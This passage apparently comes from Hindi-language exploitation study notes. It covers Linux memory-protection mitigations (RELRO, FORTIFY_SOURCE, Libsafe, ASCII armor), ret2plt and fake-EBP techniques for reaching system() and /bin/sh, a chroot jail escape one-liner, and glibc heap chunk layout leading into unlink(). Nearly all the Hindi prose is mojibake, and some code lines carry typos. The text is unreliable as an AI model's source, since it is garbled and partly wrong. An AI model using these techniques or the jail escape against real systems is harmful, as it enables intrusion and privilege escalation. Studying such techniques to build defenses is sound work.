Bind now тАФ> рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рд╣реЛрддреЗ рд╕рдордп рдЦреЛрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рд╕реЗрдХреНрд╢рди .got, .dtors, .ctors, .dynamic, .jcr рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **-z relro** рдФрд░ **-z now**

рдЗрд╕рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЬрдЯрд┐рд▓ рдирд╣реАрдВ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпреЗ рд╣рдорд▓реЗ рдЕрдм рднреА рд╕рдВрднрд╡ рд╣реИрдВред

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** тАФ> рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ BIND NOW рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ

**Fortify Source -D\_FORTIFY\_SOURCE=1 рдпрд╛ =2**

рдПрдХ рд╕реНрдерд╛рди рд╕реЗ рджреВрд╕рд░реЗ рд╕реНрдерд╛рди рдкрд░ рдбреЗрдЯрд╛ рдХреЙрдкреА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрджрд▓реЗрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:\
char buf\[16];\
strcpy(but, source);

рдпрд╣ рдЙрд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ strcpy() рдХреЛ \_\_strcpy\_chk() рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдмрдлрд░ рдХрд╛ рдЖрдХрд╛рд░ рдЕрдзрд┐рдХрддрдо рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**=1** рдпрд╛ **=2** рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рд╣реИ рдХрд┐:

рджреВрд╕рд░рд╛ рдпрд╣ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рдХрд┐ **%n** рдПрдХ рд▓реЗрдЦрди рдпреЛрдЧреНрдп рд╕реЗрдХреНрд╢рди рд╕реЗ рдЖрддрд╛ рд╣реИред рд╕рд╛рде рд╣реА рдкреНрд░рд╛рдердорд┐рдХ рддрд░реАрдХреЗ рд╕реЗ рдкрд╣реБрдВрдЪ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЗрд╡рд▓ рдЙрд╕ рд╕рдордп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдкрд╣рд▓реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╣реЛрдВ, рдпрд╛рдиреА рдХреЗрд╡рд▓ рддрдм рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдкрд╣рд▓реЗ **%2$d** рдФрд░ **%1$d** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП argv\[0] рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЗрд╕реЗ рджреВрд╕рд░реЗ рд╕реНрдерд╛рди (рдЬреИрд╕реЗ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рд╡реЗрд░рд┐рдПрдмрд▓) рдХреЗ рдкрддреЗ рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред рдкреГрд╖реНрда 191

**Libsafe рдХреА рдЬрдЧрд╣**

рдЗрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: LD\_PRELOAD=/lib/libsafe.so.2\
рдпрд╛\
тАЬ/lib/libsave.so.2тАЭ > /etc/ld.so.preload

рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рд╕реЗ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдЕрдВрддрд░реНрдЧрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдиреНрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдирдХреАрдХреГрдд рдирд╣реАрдВ рд╣реИред (рдХреЗрд╡рд▓ x86 рдХреЗ рд▓рд┐рдП, -fomit-frame-pointer рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рд╕реНрдЯреЗрдЯрд┐рдХ рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рд╕рднреА рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдФрд░ LD\_PRELOAD рдмрд╛рдЗрдирд░реА рдореЗрдВ рд╕реБрдЗрдб рдХреЗ рд╕рд╛рде рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ)ред

**ASCII Armored Address Space**

рдпрд╣ 0x00000000 рд╕реЗ 0x00ffffff рддрдХ рд╢реЗрдпрд░реНрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рд╣реИ рддрд╛рдХрд┐ рд╣рдореЗрд╢рд╛ 0x00 рдПрдХ рдмрд╛рдЗрдЯ рд╣реЛред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╣рдорд▓реЗ рдХреЛ рд▓рдЧрднрдЧ рд░реЛрдХрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рдФрд░ рдЫреЛрдЯреЗ рдЗрдВрдбрд┐рдпрди рдореЗрдВ рднреА рдирд╣реАрдВред

**ret2plt**

рдЗрд╕рдореЗрдВ рдПрдХ ROP рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ plt рдХреА strcpy@plt рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ GOT рдХреА рдПрдВрдЯреНрд░реА рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕ рдлрд╝рдВрдХреНрд╢рди (system()) рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реИ, рдЙрд╕рдХрд╛ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж рдпрд╣реА рдХрд╛рдо GOT+1 рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ system() рдХрд╛ 2рд╡рд╛рдВ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ... рдЕрдВрдд рдореЗрдВ GOT рдореЗрдВ рд╕рд╣реЗрдЬреА рдЧрдИ рдкрддрд╛ рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ system() рд╣реЛрдЧрд╛ред

**Falso EBP**

рдЬрд┐рди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХрд╛ EBP рдХреЛ рддрд░реНрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ EIP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ system() рдХреЛ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EBP рдХреЛ рднреА рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рднреА рджреЛ рдмрд╛рдЗрдЯ рдХреЛ рдЬрд┐рд╕реЗ рднреА рдЪрд╛рд╣рд┐рдП рд░рдЦ рд╕рдХреЗ рдФрд░ рдлрд┐рд░ &тАЭ/bin/shтАЭ рдХреЗ рдкрддреЗ рдкрд░ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

**chroot() рдХреЗ рд╕рд╛рде рдЬреЗрд▓**

debootstrap -arch=i386 hardy /home/user тАФ> рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрдкрдирд┐рд░реНрдорд╛рдг рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рддрд╣рдд рдПрдХ рдмреБрдирд┐рдпрд╛рджреА рд╕рд┐рд╕реНрдЯрдо рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ

рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЗрди рдЬреЗрд▓реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ: mkdir foo; chroot foo; cd ..

**рдХреЛрдб рдХрд╛ рдЙрдкрдХрд░рдг**

Valgrind тАФ> рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 рд╣реАрдк рдУрд╡рд░рдлреНрд▓реЛ: рдореВрд▓ рдЙрддреНрдкреАрдбрд╝рди**

**рдЖрд╡рдВрдЯрд┐рдд рдЯреБрдХрдбрд╝рд╛**

рдкрд┐рдЫрд▓рд╛_рдЖрдХрд╛рд░ |\
рдЖрдХрд╛рд░ | тАФрд╣реЗрдбрд░\
\*рдореЗрдо | рдбреЗрдЯрд╛

**рдлреНрд░реА рдЯреБрдХрдбрд╝рд╛**

рдкрд┐рдЫрд▓рд╛_рдЖрдХрд╛рд░ |\
рдЖрдХрд╛рд░ |\
\*fd | рдкреАрдЯреАрдЖрд░ рдлреЙрд░рд╡рд░реНрдб рдЪрдВрдХ рдХрд╛ рдкрддрд╛\
\*bk | рдкреАрдЯреАрдЖрд░ рдмреИрдХ рдЪрдВрдХ рдХрд╛ рдкрддрд╛ тАФрд╣реЗрдбрд░\
\*рдореЗрдо | рдбреЗрдЯрд╛

рдлреНрд░реА рдЯреБрдХрдбрд╝реЗ рдПрдХ рдбрдмрд▓ рд▓рд┐рдВрдХреНрдб рд▓рд┐рд╕реНрдЯ рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ (рдмрд┐рди) рдФрд░ рдХрднреА-рдХрднреА рджреЛ рдлреНрд░реА рдЯреБрдХрдбрд╝реЗ рдПрдХ рд╕рд╛рде рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ (рд╡реЗ рдорд┐рд▓ рдЬрд╛рддреЗ рд╣реИрдВ)

"рдЖрдХрд╛рд░" рдореЗрдВ рдЗрдВрдбрд┐рдХреЗрдЯрд░ рдмрд┐рдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ: рдпрджрд┐ рдкрд┐рдЫрд▓рд╛ рдЯреБрдХрдбрд╝рд╛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ, рдпрджрд┐ рдЯреБрдХрдбрд╝рд╛ mmap() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рдЯреБрдХрдбрд╝рд╛ рдореБрдЦреНрдп рдПрд░рд┐рдирд╛ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред

рдпрджрд┐ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХреЛрдИ рднреА рд╕рдВрджрд░реНрднреА рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реИ, рддреЛ рдпреЗ рдореИрдХреНрд░реЛ unlink() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдорд┐рд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдирдпрд╛ рдЯреБрдХрдбрд╝рд╛ рдЬреЛ рдЕрдзрд┐рдХ рдмрдбрд╝рд╛ рд╣реИ, рдЙрд╕реЗ frontlink() рдХреЗ рдкрд╛рд╕ рднреЗрдЬ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЙрдЪрд┐рдд рдмрд┐рди рдореЗрдВ рдбрд╛рд▓ рд╕рдХреЗред

unlink(){\
BK = P->bk; тАФ> рдирдП рдЪрдВрдХ рдХрд╛ BK рдкрд╣рд▓реЗ рдЬреЛ рдлреНрд░реА рдерд╛ рдЙрд╕рдХрд╛ рд╣реИ\
FD = P->fd
